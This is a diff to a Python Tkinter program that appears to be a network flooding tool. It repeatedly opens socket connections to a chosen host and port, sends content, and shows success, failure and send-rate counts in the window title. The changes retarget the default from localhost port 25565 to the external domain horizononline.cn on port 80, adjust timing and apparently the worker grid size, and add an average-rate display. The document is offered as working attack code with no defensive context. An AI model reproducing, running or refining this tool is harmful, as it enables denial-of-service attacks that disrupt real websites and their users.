@@ -5,10 +5,10 @@ import time
 import sys
 from tkinter import *
 
-socket.setdefaulttimeout(5.0) #timeout
+socket.setdefaulttimeout(10.0) #timeout
 shouldq=1
-xs=15 #x-size
-ys=10 #y-size
+xs=20 #x-size
+ys=15 #y-size
 ver='2.0' #version
 inited=False
 okt=0
@@ -37,6 +37,7 @@ def k(y,x):
                 s.connect((host,port))
                 s.send(content)
                 s.close()
+                time.sleep(0.2)
             except:
                 raise
                 if shouldq==1:
@@ -95,9 +96,9 @@ def init():
     setup=Tk()
     
     hostvar=StringVar() #target-hostname
-    hostvar.set('127.0.0.1')
+    hostvar.set('horizononline.cn')
     portvar=IntVar() #target-port
-    portvar.set(25565)
+    portvar.set(80)
 
     ipselect=Entry(setup,textvariable=hostvar)
     portselect=Entry(setup,textvariable=portvar)
@@ -114,13 +115,15 @@ def init():
 
 def stats(callback):
     cached=0
+    tall=1
     try:
         while 1:
             if shouldq==0:
-                callback.title('成功%s  失败%s  速率%s'%(okt,failt,okt-cached))
+                callback.title('成功%s  失败%s  速率%s 平均%s'%(okt,failt,okt-cached,okt//tall))
             else:
                 callback.title('神通 '+ver)
             cached=okt
+            tall+=1
             time.sleep(1)
     except:
         return
